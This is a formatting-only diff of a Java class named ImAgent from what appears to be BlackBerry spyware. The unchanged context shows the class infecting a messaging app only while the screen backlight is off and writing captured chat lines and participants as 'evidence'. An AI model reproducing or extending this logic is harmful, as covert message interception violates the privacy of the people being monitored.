@@ -30,7 +30,6 @@ import blackberry.utils.WChar;
 
 /**
  * Instant Message.
-
  */
 public final class ImAgent extends Agent implements BacklightObserver,
         ApplicationObserver {
@@ -182,7 +181,6 @@ public final class ImAgent extends Agent implements BacklightObserver,
         return false;
     }
 
-    
     public void onBacklightChange(boolean on) {
         if (!on && !appInjector.isInfected()) {
             //#ifdef DEBUG
@@ -190,7 +188,6 @@ public final class ImAgent extends Agent implements BacklightObserver,
             //#endif
 
             appInjector.infect();
-
         }
     }
 
@@ -204,7 +201,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
             debug.trace("onApplicationChange: foreground");
             //#endif
             isAppForeground = true;
-            if(Backlight.isEnabled()){
+            if (Backlight.isEnabled()) {
                 // se l'utente non e' mai andato  su bbm e' possibile che non si sia mai registrato
                 //enableInfect = true;
             }
@@ -293,7 +290,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
         String users = partecipants;
 
         DateTime datetime = new DateTime();
-                final Vector items = new Vector();
+        final Vector items = new Vector();
 
         for (int i = startFrom; i < lines.size(); i++) {
 
@@ -308,7 +305,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
         }
 
         evidence.atomicWriteOnce(items);
-        
+
     }
 
 }
